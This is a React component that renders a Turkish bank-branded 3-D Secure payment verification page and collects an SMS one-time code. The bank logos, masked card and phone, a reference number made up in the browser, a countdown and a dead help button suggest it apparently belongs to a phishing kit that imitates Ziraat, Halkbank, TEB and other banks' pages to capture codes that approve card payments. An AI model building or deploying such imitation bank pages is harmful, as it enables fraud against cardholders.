'use client';

import CardSchemeBadge from '@/components/CardSchemeBadge';
import { detectCardScheme } from '@/lib/cardUtils';
import { BankLogoFromBrand } from '@/components/banks/logos/BankLogo';
import BkmGoLogo from '@/components/payments/BkmGoLogo';
import ThreeDSecureShell from './ThreeDSecureShell';
import {
  formatAmount,
  maskCardGeneric,
  maskPhoneGeneric,
  referenceCode,
} from './threeDSecureUtils';
import { useCountdownTimer } from './useCountdownTimer';
import { useClientMountValue } from './useClientMountValue';
import { useStoreTheme } from '@/components/StoreThemeProvider';
import type { BankThreeDSecureProps } from './types';

const WHITE_HEADER_BAR_IDS = new Set(['ziraat', 'halkbank']);

const THREE_D_BANK_LOGO_HEIGHT: Partial<Record<string, number>> = {
  teb: 112,
};

export default function BankThreeDSecurePage({
  bank,
  amount,
  cardNumber,
  phoneNumber,
  verificationCode,
  onVerificationCodeChange,
  error,
  loading,
  transactionDate,
  merchantName: merchantNameProp,
  onSubmit,
  onCancel,
}: BankThreeDSecureProps) {
  const { copy } = useStoreTheme();
  const merchantName = merchantNameProp ?? copy.merchantName;
  const formattedAmount = formatAmount(amount);
  const { mmss } = useCountdownTimer(174);
  const refCode = useClientMountValue(referenceCode, '--------');
  const scheme = detectCardScheme(cardNumber);
  const useGoSecurePay = scheme.id === 'troy' || scheme.id === 'other';
  const whiteHeaderBar = WHITE_HEADER_BAR_IDS.has(bank.id);
  const swapHeaderLogos = bank.id === 'teb';

  const schemeLogo = useGoSecurePay ? (
    <BkmGoLogo height={28} />
  ) : (
    <CardSchemeBadge cardNumber={cardNumber} compact />
  );

  const bankLogo = swapHeaderLogos ? (
    <BankLogoFromBrand
      bank={bank}
      height={THREE_D_BANK_LOGO_HEIGHT.teb}
      className="object-left-top"
    />
  ) : (
    <div className="flex shrink-0 items-center">
      <BankLogoFromBrand bank={bank} height={THREE_D_BANK_LOGO_HEIGHT[bank.id] ?? 28} />
    </div>
  );

  const schemeLogoSlot = swapHeaderLogos ? (
    <div className="absolute right-4 top-3 flex shrink-0 items-start">{schemeLogo}</div>
  ) : (
    schemeLogo
  );

  const rows = [
    { label: 'İşyeri Adı', value: merchantName.toUpperCase() },
    { label: 'İşlem Tutarı', value: `${formattedAmount} TL`, bold: true },
    { label: 'İşlem Tarihi-Saati', value: transactionDate },
    { label: 'Kart Numarası', value: maskCardGeneric(cardNumber) },
  ];

  return (
    <ThreeDSecureShell onClose={onCancel}>
      <div className={`pb-5 ${swapHeaderLogos ? 'pt-0' : 'px-4 pt-4'}`}>
        {swapHeaderLogos ? (
          <div className="relative mb-4 h-[7.75rem]">
            <div className="absolute left-0 top-0">{bankLogo}</div>
            {schemeLogoSlot}
          </div>
        ) : (
          <div
            className={`mb-4 flex items-center justify-between gap-3 ${
              whiteHeaderBar ? 'rounded-lg border border-gray-200 bg-white px-3 py-2.5' : ''
            }`}
          >
            {schemeLogo}
            {bankLogo}
          </div>
        )}

        <div className={swapHeaderLogos ? 'px-4' : ''}>

        <h2 className="mb-4 text-center text-[15px] font-bold text-gray-900">
          Doğrulama kodunu giriniz
        </h2>

        <div className="mb-4 border-y border-gray-300">
          {rows.map((row) => (
            <div
              key={row.label}
              className="flex items-start justify-between gap-3 border-b border-gray-200 px-1 py-2.5 text-[13px] last:border-b-0"
            >
              <span className="shrink-0 text-gray-700">{row.label}</span>
              <span
                className={`text-right text-gray-900 ${row.bold ? 'font-bold' : 'font-medium'} ${
                  row.label === 'Kart Numarası' ? 'font-mono tracking-wide' : ''
                }`}
              >
                {row.value}
              </span>
            </div>
          ))}
        </div>

        <p className="mb-1 text-center text-[13px] leading-relaxed text-gray-800">
          Şifreniz{' '}
          <span className="font-semibold">{maskPhoneGeneric(phoneNumber)}</span> nolu cep telefonunuza
          gönderilecektir.
        </p>
        <p className="mb-4 text-center text-[13px] text-gray-800">
          Referans no: <span className="font-semibold">{refCode}</span>
        </p>

        {error && (
          <div className="mb-3 rounded border border-red-200 bg-red-50 px-3 py-2 text-center text-xs text-red-600">
            {error}
          </div>
        )}

        <form onSubmit={onSubmit}>
          <p className="mb-2 text-center text-sm font-bold text-gray-900">Doğrulama Kodu</p>

          <input
            type="password"
            inputMode="numeric"
            autoComplete="one-time-code"
            value={verificationCode}
            onChange={(e) => onVerificationCodeChange(e.target.value.replace(/\D/g, '').slice(0, 6))}
            maxLength={6}
            className="mb-4 w-full rounded border border-gray-300 px-4 py-3 text-center text-lg tracking-widest outline-none focus:border-[#00a8a8]"
          />

          <button
            type="submit"
            disabled={loading || verificationCode.length < 4}
            className="mb-3 w-full rounded bg-[#00a8a8] py-3 text-sm font-bold text-white disabled:bg-gray-300"
          >
            {loading ? 'Gönderiliyor...' : 'Onayla'}
          </button>

          <p className="mb-4 text-center text-sm text-gray-800">
            Kalan Süre: <span className="font-semibold">{mmss}</span>
          </p>

          <div className="flex justify-center gap-6 text-sm font-medium text-[#00a8a8]">
            <button type="button" onClick={onCancel} className="hover:underline">
              İşlemi İptal Et
            </button>
            <button type="button" className="hover:underline">
              Yardım
            </button>
          </div>
        </form>
        </div>
      </div>
    </ThreeDSecureShell>
  );
}
